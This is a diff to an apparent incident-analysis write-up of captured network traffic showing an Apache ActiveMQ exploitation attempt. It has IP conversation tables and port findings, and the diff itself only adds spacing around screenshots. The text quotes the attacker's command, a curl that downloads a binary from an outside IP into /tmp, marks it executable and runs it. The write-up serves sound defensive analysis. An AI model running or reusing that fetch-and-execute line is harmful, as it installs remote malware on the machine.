@@ -71,6 +71,8 @@ Three main IP conversations were observed:
 | 84.239.49.16 | 134.209.197.3 | 12 | 712 |
 | 134.209.197.3 | 128.199.52.72 | 10 | 1,210 |
 | 146.190.21.92 | 134.209.197.3 | 4,867 | 4,927,186 |
+
+
 ![](image_2026-11-20_184012931.png)
 The IP address `134.209.197.3` appeared in all three conversations and was identified as the central server in the observed communication pattern.
 
@@ -95,6 +97,8 @@ The following connections were identified:
 | 134.209.197.3 | 146.190.21.92 | 8000 | 1, 2 |
 | 134.209.197.3 | 128.199.52.72 | 80 | 3 |
 | 134.209.197.3 | 146.190.21.92 | 443 | 4 |
+
+
 ![](image_2026-11-20_185208729.png)
 Port `61616` was particularly important because it is commonly associated with Apache ActiveMQ and its OpenWire protocol.
 
@@ -112,6 +116,8 @@ The IPv4 Endpoints statistics were reviewed to understand the traffic distributi
 | 128.199.52.72 | 10 | 1,210 | 789 | 421 |
 | 134.209.197.3 | 4,889 | 4,929,108 | 257,226 | 4,671,882 |
 | 146.190.21.92 | 4,867 | 4,927,186 | 4,670,705 | 256,481 |
+
+
 ![](image_2026-11-20_185721230.png)
 The endpoint statistics showed a significant amount of traffic transmitted from `146.190.21.92` toward `134.209.197.3`.
 
@@ -133,7 +139,12 @@ The connection involved:
 | Destination Port | 61616 |
 | Protocol Context | OpenWire / Apache ActiveMQ |
 
+
+
+
 ![](image_2026-11-20_191323925.png)
+
+
 
 ![](image_2026-11-20_192002611.png)
 Port `61616` is commonly used by Apache ActiveMQ for OpenWire communication.
@@ -168,6 +179,9 @@ The relevant command was:
 ```bash
 curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker
 ```
+
+
+
 ![](image_2026-11-20_194033167.png)
 This command attempts to:
 
@@ -187,6 +201,9 @@ Therefore, the XML demonstrates an execution attempt, but the PCAP alone does no
 **Finding:** The XML payload contained a command consistent with an attempt to retrieve and execute a remote Linux binary.
 
 ### 7. Payload Download Investigation
+
+
+
 ![](image_2026-11-20_194611034.png)
 The HTTP traffic was then examined for the requested executable.
 
